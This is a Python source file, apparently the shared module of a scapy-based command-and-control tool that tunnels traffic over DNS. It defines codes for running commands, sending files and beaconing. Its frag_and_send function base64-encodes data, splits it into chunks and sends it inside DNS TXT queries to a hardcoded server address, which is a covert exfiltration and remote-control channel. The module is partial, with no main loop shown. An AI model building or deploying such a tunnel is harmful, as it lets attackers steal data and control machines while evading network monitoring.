import os
from scapy.all import *
import signal
import subprocess
import threading
import base64

 
from scapy.all import *
import threading

FILE = b'filexx'           # module to send file
RUN = b'runxxx'            # module to run command
BEACON = b'beacon'          # client is ready to recieve command
BEGIN_OUTPUT = b'begino'    # server to open output_file
BEGIN_FILE = b'beginf'       # server to open file - name of the file in the data
IN_TRANSFER = b'transf'      # server to continue writing to the opened file
EF = b'eofeof'              # server to close the opened file

SERVER_ADR = "192.168.1.22"


LOG_OUTPUT = ".log_output.txt"


RUN_MODEL = "run"
SEND_MODEL = "send"


def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
def sniff_pkt(pfilter,handler,cnt=1000,timer=1000):
    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
    #
def frag_and_send(packet,bin_data,is_client,is_output,bin_pref):
    data = base64.b64encode(bin_data).decode('ascii')
    pref = base64.b64encode(bin_pref).decode('ascii')
    for i in range(0, len(data), 30):
        chunk = data[i:i+30]
        if is_output == 1:
            content = base64.b64encode(IN_TRANSFER).decode('ascii')
            content+=chunk
        elif is_output == 0:
            content = pref
            content+=data
        if is_client == 1:
            pkt = IP(dst=SERVER_ADR)/UDP(sport=1234,dport=53)/DNS(rd =1,qr=0,qd=DNSQR(qtype="TXT", qname=content))
        elif is_client == 0:
            pkt = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(qd=packet[DNS].qd,rd=0,qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,type='TXT',rdata=content))
        send(pkt)
        time.sleep(300/1000)   
        
def close_file(fd):
    os.close(fd)
    
    
def add_padding(received_base64_data):
    padding_needed = len(received_base64_data) % 4
    if padding_needed > 0:
        received_base64_data += b'=' * (4 - padding_needed)
    return received_base64_data
    
    
            
    
    
